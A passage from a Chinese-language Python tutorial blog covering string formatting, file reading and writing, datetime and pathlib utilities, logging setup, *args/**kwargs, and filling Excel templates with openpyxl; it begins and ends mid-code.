class="string">f'<span class="subst">&#123;num:*^<span class="number">10.2</span>f&#125;</span>'</span>    <span class="comment"># '**12.57***'</span></span><br></pre></td></tr></table></figure><h5 id="9-1-4-对齐"><a href="#9-1-4-对齐" class="headerlink" title="9.1.4 对齐"></a>9.1.4 对齐</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##对齐</span></span><br><span class="line">num = <span class="number">12.56789</span></span><br><span class="line">print(<span class="string">f'<span class="subst">&#123;num:&lt;<span class="number">12</span>&#125;</span>'</span>)   <span class="comment">#左对齐   12.56789    </span></span><br><span class="line">print(<span class="string">f'<span class="subst">&#123;num:&gt;<span class="number">12</span>&#125;</span>'</span>)   <span class="comment">#右对齐       12.56789</span></span><br><span class="line">print(<span class="string">f'<span class="subst">&#123;num:^<span class="number">12</span>&#125;</span>'</span>)   <span class="comment">#居中对齐    12.56789</span></span><br></pre></td></tr></table></figure><h1 id="十-文件的读写"><a href="#十-文件的读写" class="headerlink" title="十. 文件的读写"></a>十. 文件的读写</h1><h3 id="10-1-写文件"><a href="#10-1-写文件" class="headerlink" title="10.1 写文件"></a>10.1 写文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">out_path = Path(<span class="string">'out_dir'</span>)</span><br><span class="line">out_dir = out_path.joinpath(<span class="string">'txt_dir'</span>)</span><br><span class="line">out_dir.mkdir(parents=<span class="literal">True</span>,exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">out_file = out_dir.joinpath(<span class="string">"1.txt"</span>)</span><br><span class="line"><span class="keyword">with</span> out_file.open(<span class="string">"w"</span>) <span class="keyword">as</span> fout:</span><br><span class="line">    fout.write(<span class="string">"hello word!"</span>)</span><br></pre></td></tr></table></figure><h3 id="10-2-读文件"><a href="#10-2-读文件" class="headerlink" title="10.2 读文件"></a>10.2 读文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(out_file,<span class="string">'r'</span>) <span class="keyword">as</span> fin:</span><br><span class="line">    cont = fin.read() <span class="comment"># 还可以读取一行 readline</span></span><br><span class="line">    print(cont)</span><br></pre></td></tr></table></figure><h1 id="十一-基础包"><a href="#十一-基础包" class="headerlink" title="十一. 基础包"></a>十一. 基础包</h1><h3 id="11-1-datetime"><a href="#11-1-datetime" class="headerlink" title="11.1 datetime"></a>11.1 datetime</h3><ul><li>datetime.date 与 datetime.datetime 互转</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">ddt = datetime.datetime(<span class="number">2020</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">datetime.date(ddt.year, ddt.month, <span class="number">1</span>)</span><br><span class="line">type(datetime.date(ddt.year, ddt.month, <span class="number">1</span>)) <span class="comment"># datetime.date</span></span><br><span class="line">type(datetime.datetime.combine(datetime.date(ddt.year, ddt.month, <span class="number">1</span>),datetime.time.min)) <span class="comment"># datetime.datetime</span></span><br></pre></td></tr></table></figure><ul><li>加减时间</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">datetime.datetime.now()</span><br><span class="line">t = datetime.datetime.now()</span><br><span class="line">print(t) <span class="comment"># 2020-10-12 16:19:05.745144</span></span><br><span class="line"><span class="comment"># 可传入的参数days=0, seconds=0, microseconds=0, milliseconds=0, minutes=0, hours=0, weeks=0</span></span><br><span class="line">t + datetime.timedelta(days=<span class="number">1</span>) <span class="comment"># datetime.datetime(2020, 10, 13, 16, 18, 51, 671294)</span></span><br></pre></td></tr></table></figure><ul><li>strftime  转换时间格式  time.strftime(format[, t])</li></ul><blockquote><p><a href="https://www.runoob.com/python/att-time-strftime.html" target="_blank" rel="noopener">参数链接</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">now = datetime.datetime.now()</span><br><span class="line">print(now)   <span class="comment"># 2020-10-12 16:21:26.721938</span></span><br><span class="line">now.strftime(<span class="string">"%Y-%m-%d"</span>)  <span class="comment"># 2020-10-12  str类型</span></span><br></pre></td></tr></table></figure><ul><li>replace,relativedelta</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> dateutil.relativedelta <span class="keyword">import</span> relativedelta <span class="comment"># 月份迁移 </span></span><br><span class="line">now = datetime.datetime.now() <span class="comment"># datetime.datetime(2020, 10, 13, 14, 17, 6, 328089)</span></span><br><span class="line">now.date().replace(day=<span class="number">1</span>) <span class="comment"># datetime.date(2020, 10, 1)</span></span><br><span class="line">now.date() + relativedelta(months=<span class="number">1</span>) <span class="comment"># datetime.date(2020, 11, 13)</span></span><br></pre></td></tr></table></figure><h3 id="11-2-Path包"><a href="#11-2-Path包" class="headerlink" title="11.2 Path包"></a>11.2 Path包</h3><ul><li>目录PATH</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> ujson <span class="keyword">as</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">out_path = <span class="string">"my_path"</span></span><br><span class="line">work_dir = Path(<span class="string">f"<span class="subst">&#123;out_path&#125;</span>"</span>)</span><br><span class="line">data_dir = work_dir.joinpath(<span class="string">'data'</span>)</span><br><span class="line">data_dir.mkdir(parents=<span class="literal">True</span>,exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">people = &#123;<span class="string">'name'</span>:<span class="string">'zx'</span>,<span class="string">'age'</span>:<span class="number">18</span>&#125;</span><br><span class="line">filename = <span class="string">f"1.json"</span></span><br><span class="line"><span class="keyword">with</span> data_dir.joinpath(filename).open(<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(people,f)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 创建文件</span></span><br><span class="line">t_dir = Path(<span class="string">'tmp'</span>)</span><br><span class="line">t_dir.mkdir(parents=<span class="literal">True</span>,exist_ok=<span class="literal">True</span>)</span><br><span class="line">fileName = Path(t_dir,<span class="string">"2.txt"</span>)</span><br><span class="line">fileName.touch(exist_ok=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="11-3-shutil"><a href="#11-3-shutil" class="headerlink" title="11.3 shutil"></a>11.3 shutil</h3><ul><li>递归删除文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">shutil.rmtree(<span class="string">'./num'</span>,ignore_errors=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h1 id="十二-参数及执行"><a href="#十二-参数及执行" class="headerlink" title="十二. 参数及执行"></a>十二. 参数及执行</h1><ul><li>py_test.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_num</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(add_num(int(sys.argv[<span class="number">1</span>]), int(sys.argv[<span class="number">2</span>])))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务器上执行python 代码并传入参数</span></span><br><span class="line">/usr/bin/python3 -u py_test.py <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><h1 id="十三-日志logging"><a href="#十三-日志logging" class="headerlink" title="十三. 日志logging"></a>十三. 日志logging</h1><h3 id="13-1-将日志输出到文件"><a href="#13-1-将日志输出到文件" class="headerlink" title="13.1 将日志输出到文件"></a>13.1 将日志输出到文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">out_dir = Path(<span class="string">'my_log'</span>)</span><br><span class="line">out_dir.mkdir(parents=<span class="literal">True</span>,exist_ok=<span class="literal">True</span>)</span><br><span class="line">LOG_FORMAT = <span class="string">"%(asctime)s - %(levelname)s - %(message)s"</span></span><br><span class="line"></span><br><span class="line">DATE_FORMAT = <span class="string">"%Y-%m-%d %H:%M:%S"</span> <span class="comment"># 设置日期格式</span></span><br><span class="line"></span><br><span class="line">logging.basicConfig(filename=<span class="string">f'<span class="subst">&#123;out_dir&#125;</span>\my.log'</span>, level=logging.DEBUG, format=LOG_FORMAT,datefmt=DATE_FORMAT)</span><br><span class="line"></span><br><span class="line">logging.debug(<span class="string">"This is a debug log."</span>)</span><br><span class="line">logging.info(<span class="string">"This is a info log."</span>)</span><br><span class="line">logging.warning(<span class="string">"This is a warning log."</span>)</span><br><span class="line">logging.error(<span class="string">"This is a error log."</span>)</span><br><span class="line">logging.critical(<span class="string">"This is a critical log."</span>)</span><br></pre></td></tr></table></figure><h3 id="13-2-将日志输出到-1-all-log-2-error-log-和-3-控制台"><a href="#13-2-将日志输出到-1-all-log-2-error-log-和-3-控制台" class="headerlink" title="13.2 将日志输出到 1. all.log  2. error.log 和 3. 控制台"></a>13.2 将日志输出到 1. all.log  2. error.log 和 3. 控制台</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.handlers</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出目录</span></span><br><span class="line">out_dir = Path(<span class="string">'my_log'</span>)</span><br><span class="line">out_dir.mkdir(parents=<span class="literal">True</span>,exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(<span class="string">'mylogger'</span>)</span><br><span class="line">logger.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 用于输出所有的日志 按照时间进行日志切割</span></span><br><span class="line"><span class="comment"># rf_handler = logging.handlers.TimedRotatingFileHandler(filename = f'&#123;out_dir&#125;\\all.log', when='midnight', interval=1, backupCount=7, atTime=datetime.time(0, 0, 0, 0))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 不拆分日志文件，a指追加模式,w为覆盖模式</span></span><br><span class="line">rf_handler = logging.FileHandler(filename = <span class="string">f'<span class="subst">&#123;out_dir&#125;</span>\\all.log'</span>, mode=<span class="string">'a'</span>, encoding=<span class="string">'utf-8'</span>)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于输出错误日志</span></span><br><span class="line">f_handler = logging.FileHandler(<span class="string">f'<span class="subst">&#123;out_dir&#125;</span>\error.log'</span>)</span><br><span class="line">f_handler.setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志格式</span></span><br><span class="line">formatter = logging.Formatter(<span class="string">"%(asctime)s - %(levelname)s - %(message)s"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个handler，用于将日志输出到控制台</span></span><br><span class="line">ch = logging.StreamHandler()</span><br><span class="line">ch.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">f_handler.setFormatter(formatter)</span><br><span class="line">rf_handler.setFormatter(formatter)</span><br><span class="line">ch.setFormatter(formatter)</span><br><span class="line"></span><br><span class="line">logger.addHandler(rf_handler)</span><br><span class="line">logger.addHandler(f_handler)</span><br><span class="line">logger.addHandler(ch)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">'debug message'</span>)</span><br><span class="line">logger.info(<span class="string">'info message'</span>)</span><br><span class="line">logger.warning(<span class="string">'warning message'</span>)</span><br><span class="line">logger.error(<span class="string">'error message'</span>)</span><br><span class="line">logger.critical(<span class="string">'critical message'</span>)</span><br></pre></td></tr></table></figure><h3 id="13-3-封装成日志类"><a href="#13-3-封装成日志类" class="headerlink" title="13.3 封装成日志类"></a>13.3 封装成日志类</h3><ul><li>myLog.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.handlers</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name=__name__)</span>:</span></span><br><span class="line">        <span class="comment"># 创建一个loggger</span></span><br><span class="line">        self.__name = name</span><br><span class="line">        self.logger = logging.getLogger(self.__name)</span><br><span class="line">        self.logger.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建一个handler，用于写入日志文件</span></span><br><span class="line">        <span class="comment">#         log_path = os.path.dirname(os.path.abspath(__file__))</span></span><br><span class="line"></span><br><span class="line">        out_dir = Path(<span class="string">'my_log'</span>)</span><br><span class="line">        out_dir.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fh = logging.handlers.TimedRotatingFileHandler(logname, when='M', interval=1, backupCount=5,encoding='utf-8')  # 指定utf-8格式编码，避免输出的日志文本乱码</span></span><br><span class="line">        <span class="comment"># 输出所有日志</span></span><br><span class="line">        fh = logging.FileHandler(<span class="string">f'<span class="subst">&#123;out_dir&#125;</span>\\all.log'</span>, mode=<span class="string">'a'</span>, encoding=<span class="string">'utf-8'</span>)  <span class="comment"># 不拆分日志文件，a指追加模式,w为覆盖模式</span></span><br><span class="line">        fh.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用于输出错误日志</span></span><br><span class="line">        f_handler = logging.FileHandler(<span class="string">f'<span class="subst">&#123;out_dir&#125;</span>\error.log'</span>, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        f_handler.setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建一个handler，用于将日志输出到控制台</span></span><br><span class="line">        ch = logging.StreamHandler()</span><br><span class="line">        ch.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置日志格式</span></span><br><span class="line">        <span class="comment"># formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 定义handler的输出格式</span></span><br><span class="line">        formatter = logging.Formatter(<span class="string">'%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]'</span></span><br><span class="line">                                      <span class="string">'-%(levelname)s-[日志信息]: %(message)s'</span>,</span><br><span class="line">                                      datefmt=<span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line"></span><br><span class="line">        fh.setFormatter(formatter)</span><br><span class="line">        f_handler.setFormatter(formatter)</span><br><span class="line">        ch.setFormatter(formatter)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 给logger添加handler</span></span><br><span class="line">        self.logger.addHandler(fh)</span><br><span class="line">        self.logger.addHandler(f_handler)</span><br><span class="line">        self.logger.addHandler(ch)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_log</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"定义一个函数，回调logger实例"</span></span><br><span class="line">        <span class="keyword">return</span> self.logger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a = Logger().get_log</span><br><span class="line">    a.error(<span class="string">'模块直接执行打印日志'</span>)</span><br><span class="line">    a.info(<span class="string">"console"</span>)</span><br></pre></td></tr></table></figure><ul><li>test_log.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tool.myLog <span class="keyword">import</span> Logger</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    l = Logger().get_log</span><br><span class="line">    l.info(<span class="string">'info message'</span>)</span><br><span class="line">    l.warning(<span class="string">'warning message'</span>)</span><br><span class="line">    l.error(<span class="string">'error message'</span>)</span><br><span class="line">    l.critical(<span class="string">'critical message'</span>)</span><br></pre></td></tr></table></figure><h1 id="十四-各个符号的使用"><a href="#十四-各个符号的使用" class="headerlink" title="十四. 各个符号的使用"></a>十四. 各个符号的使用</h1><h3 id="14-1-单星号"><a href="#14-1-单星号" class="headerlink" title="14.1  单星号 *"></a>14.1  单星号 *</h3><blockquote><ol><li>用作乘法</li><li>*args 表示任何多个无名参数，它本质是一个 tuple</li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 案例1</span></span><br><span class="line">data = [(<span class="number">1</span>,<span class="number">41</span>),(<span class="number">2</span>,<span class="number">7</span>),(<span class="number">3</span>,<span class="number">11</span>)]</span><br><span class="line">[(v,k) <span class="keyword">for</span> k,v <span class="keyword">in</span> enumerate(sorted(data, key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>]))] <span class="comment"># [((1, 41), 0), ((2, 7), 1), ((3, 11), 2)]</span></span><br><span class="line">[(*v,k) <span class="keyword">for</span> k,v <span class="keyword">in</span> enumerate(sorted(data, key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>]))] <span class="comment"># [(1, 41, 0),n (2, 7, 1), (3, 11, 2)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例2 序列解包</span></span><br><span class="line">f,*d = <span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span></span><br><span class="line">d <span class="comment"># [7, 9]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_name</span><span class="params">(id,*arg)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> arg:</span><br><span class="line">        print(id,name)</span><br><span class="line">        </span><br><span class="line">get_name(<span class="number">1</span>,<span class="string">"zs"</span>,<span class="string">"mj"</span>) </span><br><span class="line"><span class="comment"># 1 zs</span></span><br><span class="line"><span class="comment"># 1 mj</span></span><br></pre></td></tr></table></figure><h3 id="14-2-双星号"><a href="#14-2-双星号" class="headerlink" title="14.2 双星号**"></a>14.2 双星号**</h3><blockquote><ol><li><p>数字运算次方</p></li><li><p>**kwargs 表示关键字参数，它本质上是一个 dict</p></li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> ** <span class="number">3</span> <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mult_arg2</span><span class="params">(**kry)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> kry.items():</span><br><span class="line">        print(key,value)</span><br><span class="line"></span><br><span class="line">my_args = &#123;<span class="string">"a"</span>:<span class="number">23</span>,<span class="string">"b"</span>:<span class="number">1</span>,<span class="string">"c"</span>:<span class="string">"56"</span>&#125;</span><br><span class="line">mult_arg2(a = <span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">mult_arg2(**my_args)</span><br><span class="line"><span class="comment"># 结果：</span></span><br><span class="line"><span class="comment">#a 1</span></span><br><span class="line"><span class="comment">#b 2</span></span><br><span class="line"><span class="comment">#c 3</span></span><br><span class="line"><span class="comment">#a 23</span></span><br><span class="line"><span class="comment">#b 1</span></span><br><span class="line"><span class="comment">#c 56</span></span><br></pre></td></tr></table></figure><h1 id="十五-操作excel文件"><a href="#十五-操作excel文件" class="headerlink" title="十五. 操作excel文件"></a>十五. 操作excel文件</h1><ul><li>需求：将清单中的数据填写到excel中指定的位置上</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"></span><br><span class="line">df = pd.read_excel(<span class="string">'Q1季度结算清单.xlsx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先打开我们的目标表格，再打开我们的目标表单</span></span><br><span class="line">wb=openpyxl.load_workbook(<span class="string">r'供应商结算模板.xlsx'</span>)</span><br><span class="line">ws = wb[<span class="string">'Sheet1'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, ws.max_row+<span class="number">1</span>):</span><br><span class="line">    ws.row_dimensions[i].height = <span class="number">25</span> <span class="comment"># 设置表格的格式 统一行高为25</span></span><br><span class="line"><span class="keyword">for</span> k,row <span class="keyword">in</span> df.iterrows():</span><br><span class="line">    ws.cell(row = <span class="number">3</span>, column = <span class="number">3</span>).value =row[<span class="string">'supplier_name'</span>]</span><br><span class="line">    ws.cell(row = <span class="number">7</span>, column = <span class="number">5</span>).value =row[<span class="string">'有效订单数'</span>]</span><br><span class="line">    ws.cell(row = <span class="number">7</span>, column = <span class="number">6</span>).value =row[<span class="string">'GMV'</span>]</span><br><span class="line">    ws.cell(row = <span class="number">8</span>, column = <span class="number">5</span>).value =row[<span class="string">'关闭订单数'</span>]</span><br><span class="line">    file = row[<span class="string">'supplier_id'</span>]</span><br><span class="line">    <span class="comment"># 保存操作</span></span><br><span class="line">    wb.save(<span class="string">f'Q1/<span class="subst">&#123;file&#125;</span>_Q1.xlsx'</span>)</span><br></pre></td></tr></table></figure><ul><li>数据源</li></ul><p><img src="/2023/04/16/python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20201028151635914-1605091575600.png" alt="image-20201028151635914"></p><ul><li>目标表</li></ul><p><img src="/2023/04/16/python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20201028151828578.png" alt="image-20201028151828578"></p><p>16 . learn</p><p>id重排</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span 